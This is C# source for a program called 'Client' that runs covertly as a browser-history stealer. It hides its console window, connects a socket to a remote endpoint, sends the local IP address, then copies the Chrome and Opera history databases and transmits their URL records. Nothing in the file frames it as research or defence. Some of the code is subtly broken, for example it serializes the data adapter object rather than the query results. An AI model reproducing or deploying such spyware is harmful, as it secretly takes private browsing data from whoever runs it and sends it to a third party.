using System;
using System.Data.SQLite;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;

namespace Client
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        static ClientData clientData = new ClientData();
        static void Main(string[] args)
        {
            ShowWindow(GetConsoleWindow(), SW_HIDE);
            clientData.socket.Connect(clientData.iPEndPoint);
            string ip = GetIPAddres();
            clientData.socket.Send(Encoding.Unicode.GetBytes(ip));
            ChromeHistory();
            OperaHistory();

            Console.ReadLine();
        }
        static string GetIPAddres()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            return string.Empty;
        }
        static void ChromeHistory()
        {
            string path = @"\Google\Chrome\User Data\Profile 282\History";
            string chromehistorypath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + path;

            if (File.Exists("ChromeHistory"))
                File.Delete("ChromeHistory");

            File.Copy(chromehistorypath, "ChromeHistory");
            string filerpath = Path.GetFullPath("ChromeHistory");

            if (File.Exists(chromehistorypath))
            {
                using (SQLiteConnection connection = new SQLiteConnection($@"Data Source = {filerpath}; Version = 3; New = False; Compress = True; "))
                {
                    connection.Open();

                    SQLiteDataAdapter adapter = new SQLiteDataAdapter("select * from urls order by last_visit_time desc", connection);
                    string json = JsonSerializer.Serialize<SQLiteDataAdapter>(adapter);
                    clientData.socket.Send(Encoding.Unicode.GetBytes(json));

                    connection.Close();
                }
            }
        }
        static void OperaHistory()
        {
            string path = @"\Opera Software\Opera Stable\History";
            string operahistorypath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + path;

            if (File.Exists("OperaHistory"))
                File.Delete("OperaHistory");

            File.Copy(operahistorypath, "OperaHistory");
            string filerpath = Path.GetFullPath("OperaHistory");

            if (File.Exists(operahistorypath))
            {
                using (SQLiteConnection connection = new SQLiteConnection($@"Data Source = {filerpath}; Version = 3; New = False; Compress = True; "))
                {
                    connection.Open();

                    SQLiteDataAdapter adapter = new SQLiteDataAdapter("select * from urls order by last_visit_time desc", connection);
                    string json = JsonSerializer.Serialize<SQLiteDataAdapter>(adapter);
                    clientData.socket.Send(Encoding.Unicode.GetBytes(json));

                    connection.Close();
                }
            }
        }
    }
}
